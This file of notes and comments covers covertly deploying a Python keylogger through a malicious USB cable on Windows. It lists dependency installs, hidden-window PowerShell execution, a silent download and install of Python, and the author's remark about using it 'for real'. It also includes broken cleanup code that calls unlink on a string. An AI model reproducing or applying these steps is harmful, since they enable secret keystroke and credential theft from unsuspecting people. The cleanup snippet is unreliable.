# ----Random Notes----

#### install via cable

#pip install pynput

#pip install pywin32

#pip install requests

#pip install easygui

#run powershell >  pythonw "C:\Path\Path\Path\OMG CABLE STUFF\python keylogger test.py"

#powershell -WindowStyle Hidden

# --------------Install python via powershell---------------
#[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

#wget "https://www.python.org/ftp/python/3.8.0/python-3.8.0.exe" -outfile "python-3.8.0.exe"

#.\python-3.8.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0

# python keylogging program

##You will need to comment out the prints and exception prints on code if you were to use this for real, as its testing

##i have prints on here that will tell you and let you know what part of the program is going at the time and that it is

##working

#Youtube channel of original creator - https://bit.ly/2U58Lt9

#modified by me

# TO-DO list
# -----------------------------------------------------------------
Remove all .txt files will add incase internet connection breaks and errors start
import os
import glob

files = glob.glob('/tmp/*.txt')

for f in files:
    try:
        f.unlink()
    except OSError as e:
        print("Error: %s : %s" % (f, e.strerror))
#Insert into else on error
# -----------------------------------------------------------------

Optimize better

# -----------------------------------------------------------------
